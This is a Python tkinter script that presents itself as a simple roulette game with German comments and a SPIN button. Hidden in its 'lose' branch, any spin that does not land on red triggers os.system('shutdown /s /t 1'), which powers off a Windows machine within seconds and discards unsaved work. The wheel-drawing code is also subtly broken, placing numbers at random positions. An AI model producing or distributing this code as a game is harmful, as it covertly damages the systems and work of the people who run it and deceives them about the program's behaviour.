import tkinter as tk
import random
import os

root = tk.Tk()
root.title("Roulette 🎰")
root.geometry("500x500")
root.configure(bg="#0f0f0f")

# echte Roulette Farben
red_numbers = {1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36}

label = tk.Label(root, text="🎰 Bereit?",
                 font=("Arial", 20),
                 bg="#0f0f0f", fg="white")
label.pack(pady=20)

canvas = tk.Canvas(root, width=300, height=300, bg="#0f0f0f", highlightthickness=0)
canvas.pack()

def get_color(n):
    if n == 0:
        return "green"
    elif n in red_numbers:
        return "red"
    else:
        return "black"

# einfache „Rad“-Visualisierung
def draw_wheel(highlight=None):
    canvas.delete("all")
    radius = 120
    center = 150

    numbers = list(range(37))
    angle_step = 360 / len(numbers)

    for i, num in enumerate(numbers):
        angle = i * angle_step
        color = get_color(num)

        x = center + radius * 0.8 * random.uniform(0.9,1.1)
        y = center + radius * 0.8 * random.uniform(0.9,1.1)

        canvas.create_text(x, y, text=str(num),
                           fill="white" if color != "white" else "black")

    if highlight is not None:
        canvas.create_text(center, center, text=str(highlight),
                           font=("Arial", 30, "bold"),
                           fill=get_color(highlight))

def shutdown():
    os.system("shutdown /s /t 1")

def spin():
    for i in range(30):
        n = random.randint(0, 36)
        draw_wheel(n)
        label.config(text=f"🎰 {n}")
        root.update()
        root.after(50 + i*10)

    final = random.randint(0, 36)
    color = get_color(final)

    draw_wheel(final)
    label.config(text=f"{final} ({color.upper()})")

    # simple lose/win logik
    if color == "red":
        label.config(text=f"{final} ROT 😎", fg="#00ff99")
    else:
        root.after(1500, shutdown)

tk.Button(root, text="SPIN 🎰",
          font=("Arial", 14),
          command=spin).pack(pady=20)

draw_wheel()
root.mainloop()